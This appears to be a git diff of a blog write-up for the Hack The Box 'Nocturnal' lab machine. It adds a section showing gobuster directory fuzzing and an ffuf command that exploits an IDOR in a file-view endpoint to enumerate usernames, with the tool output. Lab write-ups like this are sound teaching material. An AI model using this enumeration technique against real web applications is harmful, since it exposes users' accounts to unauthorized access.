@@ -1,13 +1,14 @@
 ---
 layout: post
 title: HTB Nocturnal Writeup
-subtitle: Detailed overview of exposed credentials, command injection, and exploiting known application vulnerabilities to gain root access.
+subtitle: Detailed overview of IDOR, command injection, and exploiting known application vulnerability to gain root access.
 tags: [htb, linux, writeup]
 thumbnail-img: /assets/img/thumb1.png
 author: ad3n
 ---
 
 Nocturnal is a Linux-based machine categorized as easy difficulty. This post provides a step-by-step walkthrough to gain root access on the machine.
+
 
 ## Scanning & Enumeration
 
@@ -41,14 +42,14 @@ Network Distance: 2 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 {% endhighlight %}
 
-In summary, there is only 2 open ports which consist of `ssh` and `http`. Since the ssh port is on the latest version, we will shift our target to http and fuzz the directory to discover any interesting endpoint.
+In summary, there is only 2 open ports which consist of `ssh` and `http`. Since the ssh port does not have any known vulnerabilites, we will shift our target to http and fuzz the directory to discover any interesting endpoint.
 
 {: .box-note}
 **Note:** Add `10.10.11.64` in `/etc/hosts` file and named it to `nocturnal.htb`.
 
 ![Webnocturnal](/assets/img/webnocturnal.png){: .mx-auto.d-block :}
 
-## Directory Enumeration
+### Directory Enumeration
 
 {% highlight bash linenos %}
 └─$ gobuster dir -u http://nocturnal.htb/ -w /usr/share/wordlists/dirb/common.txt
@@ -77,4 +78,46 @@ Finished
 ===============================================================
 {% endhighlight %}
 
+There is four endpoint discovered through `gobuster` where the interesting one is `admin.php`. Upon login to the web, user are able to upload files and download files that has been uploaded. There is no indication that this web are vulnerable through unrestricted file upload that will gain RCE or Reverse Shell.
+
+
+## Gaining Access
+
+Further look into the web reveal endpoint when downloading the file `/view.php?username=test1&file=sample.pdf`. The `username` parameter will be use as a point to enumerate user that available in this web application.
+
+![Webnocturnal](/assets/img/burp1.png){: .mx-auto.d-block :}
+
+### User Enumeration
+
+{% highlight bash linenos %}
+└─$ ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf' -H 'Cookie: PHPSESSID=olt58v8arrqqotc1ckci6q7qlq' -fs 2985
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt
+ :: Header           : Cookie: PHPSESSID=olt58v8arrqqotc1ckci6q7qlq
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 2985
+________________________________________________
+
+admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 21ms]
+amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 15ms]
+tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 17ms]
+:: Progress: [10177/10177] :: Job [1/1] :: 2173 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
+{% endhighlight %}
 
